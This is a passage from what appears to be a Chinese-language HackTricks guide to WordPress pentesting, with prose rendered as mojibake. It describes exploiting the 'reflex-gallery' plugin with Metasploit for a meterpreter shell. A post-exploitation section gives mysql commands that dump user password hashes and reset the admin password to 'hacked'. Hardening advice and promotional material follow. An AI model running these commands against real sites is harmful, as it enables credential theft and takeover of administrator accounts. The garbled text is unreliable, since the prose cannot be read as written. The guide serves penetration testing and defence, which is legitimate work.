ä¸€æ—¦æˆåŠŸå®‰è£…äº†æ’ä»¶åŒ…ï¼Œæˆ‘ä»¬éœ€è¦æ¿€æ´»æ’ä»¶ã€‚

![](https://i2.wp.com/1.bp.blogspot.com/-YrFg94Y2EZs/XY9pzydfLDI/AAAAAAAAgug/AjZyQ6Na8kUUmquJXwoapxcmr2-8nAMwQCLcBGAsYHQ/s1600/13.png?w=687\&ssl=1)

ä¸€åˆ‡å‡†å¤‡å°±ç»ªåï¼Œå¼€å§‹åˆ©ç”¨ã€‚ç”±äºæˆ‘ä»¬å·²ç»å®‰è£…äº†åä¸ºâ€œreflex-galleryâ€çš„æ˜“å—æ”»å‡»çš„æ’ä»¶ï¼Œå› æ­¤å¾ˆå®¹æ˜“è¿›è¡Œåˆ©ç”¨ã€‚

æ‚¨å°†åœ¨Metasploitæ¡†æ¶ä¸­æ‰¾åˆ°æ­¤æ¼æ´çš„åˆ©ç”¨ï¼Œå› æ­¤åŠ è½½ä»¥ä¸‹æ¨¡å—å¹¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

æ‰§è¡Œä¸Šè¿°å‘½ä»¤åï¼Œæ‚¨å°†è·å¾—meterpreterä¼šè¯ã€‚æ­£å¦‚æœ¬æ–‡æ‰€è¿°ï¼Œæœ‰å¤šç§æ–¹æ³•å¯ä»¥åˆ©ç”¨WordPresså¹³å°çš„ç½‘ç«™ã€‚

![](https://i1.wp.com/1.bp.blogspot.com/-s6Yblqj-zQ8/XY9pz0qYWAI/AAAAAAAAguo/WXgEBKIB64Ian\_RQWaltbEtdzCNpexKOwCLcBGAsYHQ/s1600/14.png?w=687\&ssl=1)

## åæ¸—é€

æå–ç”¨æˆ·åå’Œå¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
æ›´æ”¹ç®¡ç†å‘˜å¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## WordPressä¿æŠ¤

### å®šæœŸæ›´æ–°

ç¡®ä¿WordPressã€æ’ä»¶å’Œä¸»é¢˜éƒ½æ˜¯æœ€æ–°ç‰ˆæœ¬ã€‚è¿˜è¦ç¡®è®¤åœ¨wp-config.phpä¸­å¯ç”¨äº†è‡ªåŠ¨æ›´æ–°ï¼š
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
æ­¤å¤–ï¼Œ**åªå®‰è£…å¯ä¿¡èµ–çš„WordPressæ’ä»¶å’Œä¸»é¢˜**ã€‚

### å®‰å…¨æ’ä»¶

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **å…¶ä»–å»ºè®®**

* åˆ é™¤é»˜è®¤çš„**admin**ç”¨æˆ·
* ä½¿ç”¨**å¼ºå¯†ç **å’Œ**åŒå› ç´ è®¤è¯**
* å®šæœŸ**å®¡æŸ¥**ç”¨æˆ·**æƒé™**
* **é™åˆ¶ç™»å½•å°è¯•**ä»¥é˜²æ­¢æš´åŠ›ç ´è§£æ”»å‡»
* é‡å‘½å**`wp-admin.php`**æ–‡ä»¶ï¼Œå¹¶ä»…å…è®¸å†…éƒ¨è®¿é—®æˆ–ç‰¹å®šIPåœ°å€è®¿é—®ã€‚

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·é©±åŠ¨ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
